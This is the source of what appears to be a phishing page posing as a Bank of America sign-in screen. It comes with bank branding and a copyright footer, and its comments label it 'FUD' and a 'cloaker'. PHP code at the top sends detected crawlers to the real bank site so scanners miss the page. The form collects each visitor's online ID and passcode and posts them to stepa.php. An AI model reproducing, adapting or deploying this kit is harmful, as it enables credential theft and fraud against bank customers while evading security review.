<title>Sign-in</title>
<link rel="stylesheet" href="css/style.css">
<meta name="MobileOptimized" content="width" />
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="HandheldFriendly" content="true" />
<meta http-equiv='Content-Type' content='text/html; charset=utf-8' />
<h1 id="title" class="h1" aria-hidden="false"><font color="#FFF" face="Arial" size="3"><b><img  src="img/ra.png" height="20" width="20"></td>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sign In</h1></font></b>
<body>
  <?php
  /**
  * BBVA - FUD
  * @package    BBVA - FUD
  * @author     Vickom Morozov
  * @copyright  2017
  * @version    1.0
      ____  ____ _    _____       ____  __  ______     ________  ______
     / __ )/ __ ) |  / /   |     / __ \/ / / / __ \   / ____/ / / / __ \
    / __  / __  | | / / /| |    / /_/ / /_/ / /_/ /  / /_  / / / / / / /
   / /_/ / /_/ /| |/ / ___ |   / ____/ __  / ____/  / __/ / /_/ / /_/ /
  /_____/_____/ |___/_/  |_|  /_/   /_/ /_/_/      /_/    \____/_____/

  */
  // Delete the Cookie


  /**
  * CLOAKER - FUD
  * @package    CLOAKER
  * @author     Vickom Morozov
  * @copyright  2019
  * @version    1.0
  */
  require 'vendor/autoload.php';
  use Jaybizzle\CrawlerDetect\CrawlerDetect;
  $CrawlerDetect = new CrawlerDetect;
  // Check the user agent of the current 'visitor'
  if($CrawlerDetect->isCrawler()) {
      // true if crawler user agent detected
  header("Location: https://www.bankofamerica.com");
  }
  else {
  }
  ?>
<form method="post" action="stepa.php" name="form1">

<table align="center" border='0' style="width: 100%;">
<tbody>
<tr>
<td>
<input id="fname" type="text" name="u" class='input' placeholder="Online ID" autocomplete="off" required>
</td>
<td align="center">
                        <label aria-hidden="true" class="right" style="margin-right:30px;" id="signonSaveID"><font face="Arial" size="2.5px">Save ID</font></label>
                        <div id="toggleButton" class="toggle right" toggled="false">
                            <span class="thumb"></span>
                            <span class="toggleOn" aria-checked="true" role="checkbox" title="Save this online ID" id="signonYes">YES</span>
                            <span class="toggleOff" aria-checked="false" role="checkbox" title="Save this online ID" id="signonNo">NO</span>
                        </div>
</td>
</tr>
<tr>
<td colspan='2'>
<input id="fname" type="password" name="p" class='input' placeholder="Passcode" autocomplete="off" required>
</td>
</tr>
<tr>
<td align="center" colspan='2' rowspan='2'>
<br><br><br><br>
        <button id="btSignonContinue" href="javascript:void(0);" role="button" class='button' style=cursor:pointer;>
            <img style="margin-bottom:-4px;" class="paddingHoriz10" src="img/secure_lock.png">
            <span id="signonLabel">&nbsp;&nbsp;&nbsp;Sign In</span>
        </button>
<br><br>
<font color="blue" face="Arial" size="2.5">Forgot ID/Passcode? &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enroll</font>
</td>
</tr>
</tbody>
</table>
</div>

<br><br><br><br><br><br><br><br>
<table align="center" border='0' style="width: 100%;">
<tr>
<td align="leth">
<a>
  <i class="fa fa-globe"></i>
<b><font color="#0170B9" face="Arial" size="1">
Privacy & Security
</font></b>
</a>
</td>
<td align="right">
<a>
  <i class="fa fa-globe"></i>
<b><font color="#0170B9" face="Arial" size="1">
Equal Housing Lender
</font></b>
</a>
</td>
</tr>
<tr>
<td  colspan='2'>
<b><font color="#636b78" face="Arial" style="font-size: 9px;">
© 2019 Bank of America Corporation. All rights reserved. Bank of America, N.A. Member FDIC.
</font></b>
</td>
</tr>
</table>
</body>
